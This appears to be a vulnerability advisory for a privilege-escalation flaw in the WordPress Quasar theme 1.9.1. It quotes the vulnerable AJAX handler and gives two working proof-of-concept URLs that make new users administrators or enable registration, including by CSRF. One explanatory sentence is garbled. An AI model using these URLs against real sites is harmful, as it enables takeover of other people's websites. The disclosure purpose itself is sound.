WordPress Quasar Theme Previlege Escalation
------------------------------------------------------------------------------


[-] Theme Link:



[-] Affected Version:

Version 1.9.1


[-] Vulnerability Description:

The vulnerable code is located in the /rock-builder/rock-builder-ui.php
script:

function rock_builder_save_template(){

    $data = $_REQUEST[&#039;data&#039;];
    $template = $_REQUEST[&#039;template&#039;];

    $templateName = $template[&#039;name&#039;];
    $templateDBName = $template[&#039;database_name&#039;];
    update_option($templateDBName, $data);

    $builderReferences = get_option("rock_builder_references",array());

    $i = 0;
    foreach($builderReferences as $ref){
        if($ref[&#039;database_name&#039;] == $templateDBName){
            $builderReferences[$i][&#039;name&#039;] = $templateName;
            update_option("rock_builder_references",$builderReferences);
            //echo "FOUND";
            break;
        }
        $i++;
    }

    exit;
}
add_action("wp_ajax_rockAjax_save_builder_template","rock_builder_save_template");

then function rock_builder_save_template can be called by logged in users
new administrator which may cause the site a full take over


[-] Proof of Concept:


Accessing The Url below with a logged in user will set the default role of
any new registered user as administrator(if you already had a user)
http://domain.tld/wp-admin/admin-ajax.php?action=rockAjax_save_builder_template&data=administrator&template[database_name]=default_role

Accessing The Url below with a logged in user will allow user registration
if it was disabled
this can be exploited by sending it to a logged in user or administrater
(CSRF)
http://domain.tld/wp-admin/admin-ajax.php?action=rockAjax_save_builder_template&data=1&template[database_name]=users_can_register

